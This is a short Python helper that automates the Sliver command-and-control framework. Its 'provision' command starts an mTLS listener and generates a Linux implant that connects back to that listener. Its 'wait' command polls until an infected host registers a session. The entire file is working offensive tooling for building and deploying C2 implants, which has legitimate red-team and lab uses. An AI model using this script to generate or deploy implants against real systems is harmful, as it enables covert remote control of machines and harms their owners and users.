"""sliver-py operator-client helper (provision/wait subcommands), run under the dedicated sliver venv."""
from __future__ import annotations

import argparse
import asyncio
import sys
import time


async def _connect(cfg_path: str):
    from sliver import SliverClient, SliverClientConfig
    config = SliverClientConfig.parse_config_file(cfg_path)
    client = SliverClient(config)
    await client.connect()
    return client


async def _provision(args) -> int:
    client = await _connect(args.cfg)
    await client.start_mtls_listener(host=args.listener_host, port=args.listener_port)

    from sliver.pb.clientpb import client_pb2
    config = client_pb2.ImplantConfig(
        GOOS="linux", GOARCH="amd64",
        IsBeacon=False,
        Format=client_pb2.OutputFormat.EXECUTABLE,
        C2=[client_pb2.ImplantC2(URL=f"mtls://{args.listener_host}:{args.listener_port}")],
    )
    generated = await client.generate_implant(config)
    data = generated.File.Data
    with open(args.out, "wb") as f:
        f.write(data)
    print(f"provisioned: listener mtls://{args.listener_host}:{args.listener_port}, implant -> {args.out}")
    return 0


async def _wait(args) -> int:
    client = await _connect(args.cfg)
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        sessions = await client.sessions()
        if sessions:
            print(f"session registered: {len(sessions)} (first={getattr(sessions[0], 'ID', '?')})")
            return 0
        await asyncio.sleep(3)
    print("no session registered before timeout", file=sys.stderr)
    return 1


def main() -> int:
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="cmd", required=True)
    pr = sub.add_parser("provision")
    pr.add_argument("--cfg", required=True)
    pr.add_argument("--listener-host", required=True)
    pr.add_argument("--listener-port", type=int, required=True)
    pr.add_argument("--out", required=True)
    w = sub.add_parser("wait")
    w.add_argument("--cfg", required=True)
    w.add_argument("--timeout", type=int, default=180)
    args = p.parse_args()
    fn = {"provision": _provision, "wait": _wait}[args.cmd]
    try:
        return asyncio.run(fn(args))
    except Exception as e:  # noqa: BLE001
        print(f"sliver_ops {args.cmd} failed: {type(e).__name__}: {e}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
